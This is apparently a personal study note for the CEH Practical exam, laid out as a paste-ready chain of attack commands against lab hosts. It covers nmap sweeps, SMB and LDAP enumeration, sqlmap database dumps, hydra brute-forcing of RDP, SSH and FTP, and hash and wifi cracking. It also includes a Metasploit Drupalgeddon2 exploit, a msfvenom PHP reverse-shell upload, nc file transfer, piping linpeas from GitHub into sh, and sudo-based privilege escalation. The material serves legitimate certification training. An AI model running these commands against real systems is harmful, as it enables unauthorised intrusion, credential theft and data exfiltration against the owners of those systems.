---
type: exam
tags: [exam, command, process]
topic: "CEH Practical — command flow"
exam_weight: high
status: done
unresolved: []
---

# CEH Practical — command flow

Every placeholder is a shell variable — set them once in 00, then paste the rest as-is.
Blocks run 00 → 13; 08b and 09 are side routes, not extra steps. Companion page: `CEH-Flow-Cheat.html` (same content, colourised).

## 00 — variables + pre-flight

```bash
mkdir -p ~/ceh && cd ~/ceh

LHOST=$(ip -4 -o addr show scope global | awk '{print $4}' | cut -d/ -f1 | head -1)
NET=10.10.55.0/24        # target subnet
IP=10.10.55.24           # target host
USER=jones
PASS=''
WL=/usr/share/wordlists/rockyou.txt
USERL=$HOME/users.txt
FILE=Sniffer.txt
DB=cinema
TBL=users
HASH=f.hash

script -q ~/ceh/session.log          # optional: transcript of the whole session
command -v zenmap xsltproc nmap hydra sqlmap msfconsole adb
```

Plain assignment is enough — one terminal, no subshells. `LHOST` is your Parrot IP, needed by every reverse payload. `command -v` tells you in one line which tool this image lacks.

## 01 — host sweep

```bash
sudo nmap -sn $NET -oA sn
grep 'Status: Up' sn.gnmap | awk '{print $2}'
```

## 02 — full port scan (fast, always output)

```bash
sudo nmap -p- -Pn -T4 --min-rate 5000 -oA full $IP        # single host
sudo nmap -p- -Pn -T4 --min-rate 5000 -oA full $NET       # whole subnet
PORTS=$(cut -d/ -f1 full.gnmap | sort -un | paste -sd,)
sudo nmap -sV --version-light -p $PORTS -oA svc $IP       # version on open ports only
sudo nmap -sV -sC -Pn -p $PORTS -oA deep $IP              # + default scripts
sudo nmap -sS -Pn -p 53,88,135,139,389,445,636,3268,3269 -oA dc $NET   # DC hunt
```

Never run scripts with `-p-`. `--min-rate 5000` is what makes it fast; drop to 1000 if you see drops.

## 03 — read the output (no bat, no web parser)

```bash
ls full.*                                   # .nmap (text) .gnmap (grep) .xml (parse)

# 1st choice on Parrot: zenmap GUI, loads the -oX file directly
zenmap full.xml                             # or Scan → Open (Ctrl+O) → full.xml

# no zenmap? same view, no GUI: nmap ships the stylesheet it uses
xsltproc /usr/share/nmap/nmap.xsl full.xml > full.html && xdg-open full.html
nmap -sV $IP -oX - | xsltproc /usr/share/nmap/nmap.xsl - > view.html   # live, no file

less -R full.nmap                           # -R = keep colours, never garbles
grep -i 'open' full.gnmap | column -t       # aligned table
xmllint --format deep.xml | less -R         # pretty XML
grep -c 'Mercury/32' svc.nmap               # "how many services" → count lines
awk '/open/{print $1,$3,$4}' full.nmap
cat svc.nmap | tee ~/ceh/notes.txt          # tee = screen AND file
```

On the Parrot exam box use Zenmap first (`zenmap full.xml` = the pretty view). The `xsltproc` line is the same renderer without a GUI, for when Zenmap is missing. Both read the same `-oX` file. `tee` copies stdin to a file while still printing it.

## 04 — service enumeration

```bash
# Domain Controller: product version + FQDN
sudo nmap -p 445 -sV --script smb-os-discovery $IP
sudo nmap -p 389 -sV $IP
ldapsearch -x -h $IP -s base namingcontexts
ldapsearch -x -h $IP -b "DC=ceh,DC=com" | grep -i version     # OS build NN.N.NNNNN
nxc smb $NET                                                  # domain + FQDN, one line
enum4linux -a $IP | grep -i -E 'domain|fqdn|netbios'

# SMB shares / files / vulns
smbclient -L //$IP -N
smbclient //$IP/share -U $USER%$PASS -c 'ls; get Sniffer.txt'
nxc smb $IP -u $USER -p $PASS --shares
sudo nmap -p 139,445 --script smb-vuln-* $IP

# RDP / ADB / banners
sudo nmap -p 3389 --open -sV $NET
sudo nmap -p 5555 --open $IP
sudo nmap -sV -p 21,22,23,80,443,3306,8080 $IP
```

## 05 — web fingerprint → content

```bash
whatweb -a 3 http://$IP
curl -sI http://$IP | grep -i -E 'server|x-powered-by'
nikto -h http://$IP -Tuning 123bde
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip,html
curl -s http://$IP/Flag.txt; curl -s http://$IP/flag.txt      # try flat paths first
searchsploit drupal 7; searchsploit -m 12345                  # -m = copy exploit to cwd
wpscan --url http://$IP --enumerate vp,vt,u                   # page_id= → WordPress
zaproxy &                                                     # ZAP GUI; or: wapiti -u http://$IP -m sql
```

## 06 — SQL injection

```bash
URL="http://$IP/?id=1"
sqlmap -u "$URL" --batch --dbs
sqlmap -u "$URL" --batch -D $DB --tables
sqlmap -u "$URL" --batch -D $DB -T $TBL --columns
sqlmap -u "$URL" --batch -D $DB -T $TBL -C flag --dump
sqlmap -u "$URL" --batch --sql-query "SELECT password FROM users WHERE username='Daniel'"

# logged in (cinema / Karen:computer): console → document.cookie
sqlmap -u "http://$IP/search.php?q=test" --cookie="PHPSESSID=abc" --batch --dbs

# no visible parameter
sqlmap -u "http://$IP" --forms --crawl=3 --level=5 --risk=3 --batch --dbs
```

page_id style: open the page, Ctrl+F "flag" in view-source before firing sqlmap.

## 07 — credentials + hash cracking

```bash
hydra -l $USER -P $WL rdp://$IP -t 1 -V -f
hydra -l $USER -P $WL ssh://$IP -t 4 -f
hydra -l $USER -P $WL ftp://$IP -t 4 -f
hydra -L $USERL -P $WL $IP smb

hashid "$HASHVALUE"                          # or hash-identifier
hashcat -m 0 $HASH $WL; hashcat -m 0 $HASH --show      # -m 0 = raw MD5
john --format=raw-md5 --wordlist=$WL $HASH
zip2john f.zip > z.hash; john z.hash --wordlist=$WL
rar2john f.rar > r.hash; john r.hash --wordlist=$WL
ssh2john id_rsa > k.hash; john k.hash --wordlist=$WL
7z x f.7z                                    # password-protected archive
```

RDP = `-t 1`. SSH stays at `-t 4` or you get false negatives. `*2john` is how an encrypted file becomes a crackable hash.

## 08 — Metasploit + shell

```bash
# A) exploit what you already fingerprinted
msfconsole -q
search drupal
use exploit/unix/webapp/drupal_drupalgeddon2
show options
set RHOSTS $IP
set RPORT 80
set LHOST $LHOST
run
sessions -l; sessions -i 1
shell; find / -name Flag.txt 2>/dev/null

# B) no public exploit → upload your own payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f raw -o exploit.php
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT 4444; run'
curl -s -F 'uploaded=@exploit.php' -F 'Upload=Upload' http://$IP/dvwa/vulnerabilities/upload/
curl -s http://$IP/hackable/uploads/exploit.php
nc -lvnp 4444                                # if the payload is a plain shell

# C) straight-in access
ssh $USER@$IP
xfreerdp /v:$IP /u:$USER /p:$PASS +clipboard     # or remmina / rdesktop -u $USER -p $PASS $IP
adb connect $IP:5555 && adb shell && adb pull /sdcard/Scan/ .
```

## 08b — file transfer

```bash
# 1. file on Windows → get it on Parrot
php -S 0.0.0.0:8000                            # on the Windows box, in the file's folder
python -m http.server 8000                     # same box, if it has python installed
wget http://$IP:8000/$FILE                     # on Parrot

# 2. file on Parrot → get it on Windows
python3 -m http.server 8000                    # on Parrot, in the file's folder
curl -O http://$LHOST:8000/$FILE               # on Windows, in cmd

# 3. no python and no php? nc instead
nc -lvnp 9000 > $FILE                          # on the receiving machine
cat $FILE | nc $LHOST 9000                     # on the machine holding the file
```

Serve on the machine that has the file, fetch on the other one. `$IP` = the Windows box, `$LHOST` = Parrot. Serving is read-only: it never receives.

## 09 — privesc + locate file

```bash
id; sudo -l
sudo -i
sudo vim   →  :!sh          # only if sudo -l lists the binary
find / -perm -4000 -type f 2>/dev/null
find / -type f -name Netnormal.txt 2>/dev/null
cat '/path/Network Pass.txt'            # quote names with spaces
ls -la ~; cut -d: -f1,7 /etc/passwd
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## 10 — artifact analysis

```bash
# PE / ELF headers (entry point, PT_LOAD 0)
file $FILE; rabin2 -H $FILE | grep -i entry
objdump -f $FILE | grep -i 'start address'
readelf -l $FILE | head -20
python3 -c "import pefile;print(hex(pefile.PE('$FILE').OPTIONAL_HEADER.AddressOfEntryPoint))"

# hashes
md5sum $FILE; sha256sum $FILE; sha384sum $FILE | cut -c97-100
hashcat -m 0 $HASH $WL; hashcat -m 0 $HASH --show

# encodings / stego
base64 -d $FILE > out; cat out
stegsnow -p password -C restricted.txt output.txt; cat output.txt | base64 -d
stegsnow -C -p 'password' restricted.txt
exiftool 'key Trip.jpg'
strings -n 6 'key Trip.jpg' | grep -E '^[A-Za-z0-9]{8}$'
steghide extract -sf 'key Trip.jpg'
stegseek 'key Trip.jpg' $WL
binwalk 'key Trip.jpg'; foremost -i 'key Trip.jpg' -o out
openstego                      # GUI, for adb-pulled images

# veraCrypt volume
hashcat --example-hashes | grep -i -A3 veracrypt
veracrypt -t --mount secret /mnt/vc --password='plain' --pim=0 --protect-hidden=no
cat /mnt/vc/EC_data.txt; veracrypt -t -d /mnt/vc

# crc32 (asked as "CRC32 value of the image")
crc32 image.cfe; cksum image.cfe
```

## 11 — traffic capture

```bash
PCAP=Evil-traffic.pcapng
capinfos $PCAP
tshark -r $PCAP -q -z endpoints,ip                 # most packets per host
tshark -r $PCAP -q -z conv,ip | head -20
tshark -r $PCAP -Y 'ip.dst==172.22.10.10' -T fields -e ip.src | sort | uniq -c | sort -rn | head
tshark -r $PCAP -Y 'tcp.flags.syn==1 and tcp.flags.ack==0' | wc -l
tshark -r $PCAP -Y 'mqtt.msgtype==3' -T fields -e mqtt.topic -e mqtt.len -e mqtt.msg
tshark -r $PCAP -Y mqtt -T fields -e mqtt.topic | awk '{print length, $0}'   # topic length
tshark -r $PCAP -q -z io,phs
```

| in the Wireshark GUI | = tshark above |
|---|---|
| `mqtt.msgtype == 3` | IoT publish packet |
| `ip.dst == 172.22.10.10` | traffic to victim |
| `tcp.flags.syn==1 and tcp.flags.ack==0` | SYN flood |
| Statistics → Endpoints → IPv4 → sort Packets | `-z endpoints,ip` |
| Statistics → Conversations → IPv4 → sort Packets | `-z conv,ip` |

"most/least packets" = sort by count, not bytes. MQTT publish = msgtype 3.

## 12 — wifi + vuln scan

```bash
CAP='capture.cap'
aircrack-ng "$CAP"                                   # handshake present?
aircrack-ng -w $WL "$CAP"
aircrack-ng -b $BSSID -w $WL "$CAP"
hcxpcaptool -z pmkid.22000 "$CAP"; hashcat -m 22000 pmkid.22000 $WL

gvm-start && xdg-open https://127.0.0.1:9392           # reports → sort severity → CVE
sudo nmap -Pn --script vuln $IP
sudo nmap -sV --script vulners -p $PORTS $IP
```

## 13 — answer hygiene

```bash
echo -n "$ANS" | wc -c               # N = number of characters
printf '%s' "$ANS" | base64 -d       # still encoded?
printf '%s' "$ANS" | od -c | head     # hidden spaces / trailing newline
```

| mask | means |
|---|---|
| A / a | uppercase / lowercase letter |
| N / n | digit |
| * or _ | any character |

Match the mask to the string you found, not the other way round. Paste exactly, no quotes, no trailing space.
